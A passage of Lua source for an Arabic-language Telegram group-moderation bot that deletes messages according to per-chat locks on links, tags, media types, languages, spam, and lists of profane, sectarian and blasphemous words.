if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
if botx1:get(BOT.."bot:welcome"..msg.chat_id_) then
if botx1:get(BOT..'welcome:'..msg.chat_id_) then
text = botx1:get(BOT..'welcome:'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = 'Hi Welcome To Group'
else
text = '🚦⁞ اهلا بك عزيزي •  {firstname}\n📚⁞ معرفك @{username} •\n🥀⁞ التزم بالقوانين لتجنب الطرد •'
end
end
local text = text:gsub('{firstname}',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('{lastname}',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('{username}',('@'..msg.content_.members_[0].username_ or ''))
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--Contact
--Contact
------- --- Contact---------bot
-- -----------------Contact
--Contact
--Contact
elseif msg_type == 'MSG:Contact' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Contact]")
end
end
end
if botx1:get(BOT..'bot:contact:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Contact]")
end
end
--Audio
--Audio
------- --- Audio---------bot
-- -----------------Audio
--Audio
--Audio
elseif msg_type == 'MSG:Audio' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Audio]")
end
end
end
if botx1:get(BOT..'bot:music:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Audio]")
end
end
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Audio]")
end
end
if msg.content_.caption_:match("#") then
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Audio]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Audio]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Audio]")
end
end
end
end
--Voice
--Voice
------- --- Voice---------faedee
-- -----------------Voice
--Voice
--Voice
elseif msg_type == 'MSG:Voice' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Voice]")
end
end
end
if botx1:get(BOT..'bot:voice:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Voice]")
end
end
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Voice]")
end
end
if msg.content_.caption_:match("#") then
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Voice]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Voice]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Voice]")
end
end
end
end
--Location
--Location
------- --- Location---------bot
-- -----------------Location
--Location
--Location
elseif msg_type == 'MSG:Location' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
if botx1:get(BOT..'bot:location:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Location]")
end
end
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Location]")
end
end
if msg.content_.caption_:match("#") then
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Location]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Location]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Location]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
end
--Video
--Video
------- --- Video---------bot
-- -----------------Video
--Video
--Video
elseif msg_type == 'MSG:Video' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Video]")
end
end
end
if botx1:get(BOT..'bot:video:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Video]")
end
end
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Video]")
end
end
if msg.content_.caption_:match("#") then
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Video]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Video] ")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Video] ")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Video]")
end
end
end
end
--Gif
--Gif
------- --- Gif---------bot
-- -----------------Gif
--Gif
--Gif
elseif msg_type == 'MSG:Gif' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Gif]")
end
end
end
if botx1:get(BOT..'bot:gifs:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Gif] ")
end
end
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Gif]")
end
end
if msg.content_.caption_:match("#") then
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Gif]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Gif]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Gif]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Gif]")
end
end
end
end
--Text
--Text
------- --- Text---------bot
-- -----------------Text
--Text
--Text
elseif msg_type == 'MSG:Text' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
botx1:setex(BOT..pm, TIME_CHECK, msgs+1)
end
end
--vardump(msg)
if botx1:get(BOT.."bot:group:link"..msg.chat_id_) == 'waiting' then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local hash = "bot:group:link"..msg.chat_id_
botx1:set(BOT..hash,glink)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group link has been saved ✅', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حفظ الرابط •', 1, 'md')
end
end
end
function check_username(extra,result,success)
--vardump(result)
local username = (result.username_ or '')
local svuser = 'user:'..result.id_
if username then
botx1:hset(svuser, 'username', username)
end
if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
if botx1:get(BOT..'bot:bots:gkgk'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
else
chat_kick(msg.chat_id_, bots[i].user_id_)
return false
end
end
end
getUser(msg.sender_user_id_,check_username)
botx1:set(BOT..'bot:editid'.. msg.id_,msg.content_.text_)
if not is_free(msg, msg.content_.text_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
check_filter_words(msg,text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Text]")
if botx1:get(BOT..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if botx1:get(BOT..'bot:text:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Text]")
end
if msg.forward_info_ then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Text]")
end
end
end
if msg.content_.text_:match("@") then
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Text]")
end
end
if msg.content_.text_:match("#") then
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Text]")
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Text]")
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Text]")
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
local hash = 'bot:sens:spam'..msg.chat_id_
if not botx1:get(BOT..hash) then
sens = 400
else
sens = tonumber(botx1:get(BOT..hash))
end
if botx1:get(BOT..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
delete_msg(chat,msgs)
print("Deleted [Lock] [Spam] ")
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Text]")
end
end
end
end
----------------bot----------
local msg = data.message_
text = msg.content_.text_
if text and is_monsh(msg.sender_user_id_, msg.chat_id_) then 
if botx1:get('bot:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
botx1:del('bot:'..bot_id..'id:user'..msg.chat_id_)  
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم الغاء الامر•', 1, 'md')
botx1:del('bot:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
botx1:del('bot:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = botx1:get('bot:'..bot_id..'id:user'..msg.chat_id_)  
botx1:incrby('bot:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
botdx(msg.chat_id_, msg.id_,  1, "🚦⁞ تم اضافه له *{ "..numadded..' }* رساله •', 1, 'md')
end
end
if text:match("طيز") or text:match("ديس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not botx1:get(BOT.."fshar"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ممنوع الفشار هنا  •', 1, 'md')   
end 
end
if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not botx1:get(BOT.."farsi"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ممنوع التكلم باللغه الفارسيه هنا  •', 1, 'md')   
end 
end
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("سني") or text:match("طائفتكم") or text:match("اني سني") or text:match("اني شيعي") or text:match("انا سني") or text:match("انا شيعي") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not botx1:get(BOT.."taf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ممنوع التكلم بالطائفيه هنا  •', 1, 'md')   
end 
end
if text:match("خره بالله") or text:match("خبربك") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not botx1:get(BOT.."kaf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ممنوع الكفر هنا  •', 1, 'md')   
end 
end
---------------------------------------------bot----------------------------------------------------------
---------------------------******** END MSG CHECKS BOT********--------------------------------------------
if botx1:get(BOT.."bot:support:link" .. msg.sender_user_id_) then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local hash = "bot:supports:link"
botx1:set(BOT..hash, glink)
if botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞  *Support link has been Saved*  •", 1, "md")
else
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفض رابط كروب الدعم •", 1, "md")
end
botx1:del(BOT.."bot:support:link" .. msg.sender_user_id_)
elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
local bID = msg.content_.text_:match("@(.*)")
local hash = "bot:supports:link"
botx1:set(BOT..hash, bID)
if botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ *Support Bot ID* has been *Saved* •", 1, "md")
else
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفض معرف الدعم •", 1, "md")
end
botx1:del(BOT.."bot:support:link" .. msg.sender_user_id_)
end
end
if botx1:get(BOT..'bot4'..msg.sender_user_id_) then
botx1:del(BOT..'bot4'..msg.sender_user_id_)
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
local data = json:decode(url)
if res == 400 then
if data.description == "Bad Request: supergroup members are unavailable" then 
botdx(msg.chat_id_,msg.id_, 1, "*🌿╿❯ لم ترفعني ادمن في قناتك ارفعني اولا •*\n", 1 , "md")
return false 
elseif data.description == "Bad Request: chat not found" then 
botdx(msg.chat_id_,msg.id_, 1, "*🌿╿❯ هذا المعرف ليس تابع لقناة •*\n", 1 , "md")
return false
end end 
if not msg.content_.text_ then
botdx(msg.chat_id_,msg.id_, 1, "*🌿╿❯ هذا المعرف ليس تابع لقناة •*\n", 1 , "md")
return false
end
local CH_BOT = msg.content_.text_:match("(.*)")
botx1:set(BOT..'bot3',CH_BOT)
botdx(msg.chat_id_,msg.id_, 1, "🌿╿❯ تم حفظ القناة •\n☑️╽❯ قم بتفعيل الاشتراك الاجباري الان •\n", 1 , "html")
return false
end
if botx1:get(BOT.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
